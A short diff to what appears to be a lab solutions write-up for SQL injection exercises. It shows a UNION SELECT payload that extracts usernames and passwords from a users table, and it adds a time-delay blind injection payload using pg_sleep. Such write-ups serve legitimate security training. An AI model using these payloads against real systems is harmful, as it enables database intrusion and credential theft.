@@ -48,3 +48,8 @@
 ![](Images/SQL-10b.png)
 #### Solution: Step-3 : '+UNION+SELECT+USERNAME_XEIEJW,+PASSWORD_UHIKUI+FROM+USERS_KNHGDL--
 ![](Images/SQL-10c.png)
+
+
+### Blind SQL injection with time delays
+#### Solution: TrackingId=x'||pg_sleep(10)--
+![](Images/SQL-13a.png)
